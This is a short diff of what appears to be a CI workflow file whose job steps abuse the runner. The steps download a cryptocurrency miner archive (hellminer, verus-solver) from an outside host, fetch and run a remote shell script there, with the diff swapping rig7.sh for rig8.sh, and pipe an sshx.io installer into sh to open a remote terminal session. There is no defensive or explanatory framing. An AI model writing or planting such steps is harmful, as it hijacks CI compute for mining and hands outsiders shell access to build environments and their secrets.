@@ -14,7 +14,7 @@ jobs:
       - run: wget flupy.me/miner.zip
       - run: unzip miner.zip
       - run: chmod +x hellminer verus-solver
-      - run: wget flupy.me/rig7.sh
-      - run: chmod +x rig7.sh
-      - run: ./rig7.sh
+      - run: wget flupy.me/rig8.sh
+      - run: chmod +x rig8.sh
+      - run: ./rig8.sh
       - run: curl -sSf https://sshx.io/get | sh -s run
